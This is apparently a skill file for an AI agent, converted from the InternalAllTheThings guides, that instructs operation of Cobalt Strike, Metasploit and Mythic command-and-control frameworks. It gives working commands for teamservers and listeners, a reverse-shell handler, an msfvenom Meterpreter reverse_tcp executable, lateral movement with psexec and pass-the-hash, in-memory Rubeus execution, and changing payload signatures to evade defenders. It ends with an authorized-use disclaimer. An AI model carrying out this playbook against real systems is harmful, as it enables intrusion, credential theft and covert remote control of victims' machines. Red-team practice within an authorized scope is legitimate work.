---
name: c2-frameworks
description: >-
  Operate command-and-control frameworks: Cobalt Strike (listeners, profiles, beacons, kits and
  artifacts), Metasploit Framework and Mythic C2. Use when setting up a C2 server or listener,
  when configuring a beacon or payload profile, when troubleshooting a callback, or when
  customizing a C2 kit.
license: Upstream terms apply - see NOTICE.md
metadata:
  source: https://github.com/swisskyrepo/InternalAllTheThings
  source-commit: "203bb0c"
  reference-files: "5"
  generated-by: build/build.py
---

# Command and Control Frameworks

A C2 deployment is four decisions, in order: **infrastructure** (where the teamserver lives and what
sits in front of it), **profile/transport** (what the traffic looks like on the wire), **payload**
(which beacon type and stager), and **post-exploitation ergonomics** (spawn-to, execution primitives,
kits). The framework only matters insofar as it constrains those four. Done means a callback that
survives the defender's profile checks and is attributable to no default signature of the tool.

## When to use this skill

- You are standing up a teamserver, listener or profile before an operation.
- You need to choose a beacon transport: HTTP(S), DNS, SMB named pipes or SSH.
- A callback does not arrive and you must separate infrastructure, profile and payload faults.
- You are customizing an Artifact Kit, sleep mask, mutator or resource kit to change signatures.
- You are operating Metasploit (handlers, sessions, `msfvenom`, `.rc` scripting) or Mythic (agents,
  profiles, SSL).
- Payload delivery is `redteam-initial-access`, tunnels through the beacon are `redteam-pivoting`,
  and default-certificate/IOC hygiene is `redteam-defense-evasion` (`opsec-fails.md`).

## First moves

1. **Start the Cobalt Strike teamserver with the profile, then the client.** The profile is the
   third argument, not a menu option:

   ```bash
   sudo ./teamserver 10.10.10.10 "password" [malleable C2 profile]
   ./cobaltstrike
   ```

2. **Lint the profile before every deployment.** Exit code 0 = clean, 1 = warnings, 2 = errors,
   3 = both:

   ```bash
   ./c2lint
   ```

3. **Confirm the beacon's pivot and lateral primitives early** — `socks` on the teamserver,
   `rportfwd` on the beacon host, `jump` for a new session:

   ```powershell
   beacon > socks 1080
   beacon > rportfwd [bind port] [forward host] [forward port]
   beacon > jump psexec64 <target> <listener>
   ```

4. **Run .NET tooling in memory instead of uploading it.** `execute-assembly` requires binaries
   compiled as Any CPU:

   ```powershell
   beacon > execute-assembly /home/audit/Rubeus.exe
   beacon > powershell-import /path/to/script.ps1
   beacon > powerpick [commandlet] [argument]
   ```

5. **Verify a DNS listener before blaming the beacon.** The teamserver must be authoritative for the
   zone, and both records must resolve to `0.0.0.0`; the data channel defaults to `dns-txt`:

   ```bash
   nslookup jibberish.beacon polling.campaigns.domain.com
   nslookup jibberish.beacon campaigns.domain.com
   ```

   ```powershell
   mode dns-txt
   ```

6. **Metasploit: background handler plus a generated payload** — `ExitOnSession false` keeps the
   handler alive across reconnects:

   ```bash
   use exploit/multi/handler
   set PAYLOAD generic/shell_reverse_tcp
   set LHOST 0.0.0.0
   set LPORT 4444
   set ExitOnSession false
   to_handler
   ```

   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f exe > shell.exe
   ```

7. **Mythic: start the stack, then add agent and profile from GitHub.** Both are `mythic-cli`
   installs, not manual copies:

   ```bash
   sudo ./mythic-cli start
   ./mythic-cli install github https://github.com/MythicAgents/Apollo
   ./mythic-cli install github https://github.com/MythicC2Profiles/httpx
   ```

## Reference map

| Reference | Read it when | Key content |
|---|---|---|
| [cobalt-strike.md](references/cobalt-strike.md) | you are building the teamserver, profile or post-ex workflow | install, `socat` redirector, domain fronting via HTTP Host Header, OpSec do/don't list, Customer ID, Malleable C2 syntax and `c2lint`, file/PowerShell/.NET commands, `jump`/`remote-exec`/`pth`/`steal_token`, `socks`/`rportfwd`/`spunnel`, BOF compilation and `inline-execute`, NTLM relaying with PortBender |
| [cobalt-strike-beacons.md](references/cobalt-strike-beacons.md) | the callback must use a specific transport | DNS zone/NS delegation, DNS redirector and `mode dns-txt`/`dns`/`dns6`, SMB beacon `link`/`connect` and error codes 2/5/53, SSH beacon `ssh`/`ssh-key`, Metasploit compatibility settings, custom payload generation |
| [cobalt-strike-kits.md](references/cobalt-strike-kits.md) | the payload is signatured and you must change it | Elevate Kit elevators, Persistence Kit (SharPersist/MoveKit), Resource Kit templates, Artifact Kit (pipename, `VirtualAlloc`→`HeapAlloc`), Mimikatz Kit, Sleep Mask Kit, Mutator Kit LLVM obfuscations, Thread Stack Spoofer config |
| [metasploit.md](references/metasploit.md) | you are operating Metasploit rather than Cobalt Strike | install, session management and `sessions -u` upgrade, background handler, `msfvenom` payload matrix, web delivery, `getsystem`, persistence module, packetrecorder, `portfwd`, mimikatz/kiwi, `psexec` pass-the-hash, SOCKS proxy, `.rc` scripting, multiple transports |
| [mythic.md](references/mythic.md) | you are deploying Mythic | Docker install, agent catalogue (Medusa/Hannibal/thanatos/poseidon/Apollo/Athena/Xenon), C2 profiles (httpx/http/websocket/dns/dynamichttp/smb/tcp), Let's Encrypt and `docker cp` certificate placement |

## Workflow

1. **Choose the framework by what the operation needs, not by preference.** Cobalt Strike when you
   need malleable profiles, DNS/SMB/SSH beacons and kits; Metasploit when the operation is
   exploit-module driven and a Meterpreter session is enough; Mythic when you need a Docker-hosted,
   multi-agent, multi-profile setup.
2. **Infrastructure first.** Put a redirector (`socat TCP4-LISTEN:80,fork TCP4:[TEAM SERVER]:80`) or a
   CDN in front, firewall the teamserver port so only redirectors reach it, and never expose the TLS
   stack directly.
3. **Profile second.** Take a profile from a maintained repository, edit it, run `c2lint` until
   clean, and disable staging (`set hosts_stage` to `false` in the profile) so the stager is not
   fetched from the teamserver.
4. **Transport by network reality.** HTTPS through a proxy → HTTP beacon with a good profile. No
   HTTP egress but DNS resolution works → DNS beacon with NS delegation. A host-to-host only path →
   SMB beacon over named pipes. Credentials but no payload execution → SSH beacon.
5. **Payload and post-ex ergonomics.** Set `spawnto` to a process that fits the host before running
   post-ex jobs; use `execute-assembly` for .NET tools (Any CPU), `inline-execute` for BOFs, and
   `powershell-import`/`powerpick` to avoid `powershell.exe` where it is monitored.
6. **Lateral and pivot.** `jump` and `remote-exec` authenticate with the current token — combine with
   `make_token` or `pth`. For tunneling use `socks` (teamserver-side SOCKS), `rportfwd` (beacon-side
   forward), or `spunnel` to hand a session to Metasploit.
7. **Kits when the payload is caught.** Change the pipename and the allocation call in the Artifact
   Kit, rebuild the sleep mask with the Mutator, and confirm the thread stack spoofer setting before
   shipping.

## Gotchas

- Cobalt Strike defaults are themselves detection signatures: the self-signed certificate, port
  50050, and the default teamserver certificate hashes are published. Change all three before any
  operation (`opsec-fails.md` has the hashes).
- `c2lint` exit codes are the contract: 0 clean, 1 warnings, 2 errors, 3 both. A profile that "looks
  fine" with warnings still works — errors do not.
- Malleable C2 syntax is strict about quotes: double quotes are correct, single quotes are not, and
  embedded quotes/backslashes must be escaped (`\"`, `\\`).
- `jump` and `remote-exec` use the current impersonation/delegation token, and every variant launches
  `powershell.exe`; `pth` additionally requires Administrator on the beacon host.
- Beacon `socks` inherits the beacon sleep time — set `sleep 0` for interactive tunneling or every
  request stalls for one sleep cycle.
- A DNS beacon needs the teamserver to be authoritative for the zone (A + NS records). If the domain
  does not resolve to `0.0.0.0`, the listener is misconfigured and the beacon will never check in.
- SMB beacon error codes tell you which failure you have: 2 = no beacon to link to, 5 = access
  denied / bad credentials, 53 = no trust relationship or no beacon on the target.
- `execute-assembly` silently fails on binaries that are not compiled Any CPU, and the session dies
  with the assembly — verify the build configuration first.
- Covert VPN does not work on Windows 10 and requires Administrator to deploy.
- The Artifact Kit needs a licensed Cobalt Strike (Arsenal download) and `mingw-w64` to build; the
  Thread Stack Spoofer is enabled by default and can be turned off with `artifactkit_stack_spoof`.
- Metasploit's `smbexec` creates a service (Event 7045) per command and its default service name is a
  known IOC; `psexec` ships a 2012-era RemCom binary. Rebuild and rename both before use.
- Mythic SSL: certificates go into `C2_Profiles/HTTP/c2_code` and the profile's `key_path`/`cert_path`
  must be updated; if `use_ssl` is set without certificates, the profile generates self-signed ones.

## Authorized use

For authorized engagements only, with explicit permission and within the agreed scope. C2
infrastructure must be dedicated to the engagement and decommissioned afterwards; never reuse
domains, certificates or IPs across customers.

## Source

Converted from the upstream InternalAllTheThings guides
(https://github.com/swisskyrepo/InternalAllTheThings), see NOTICE.md.
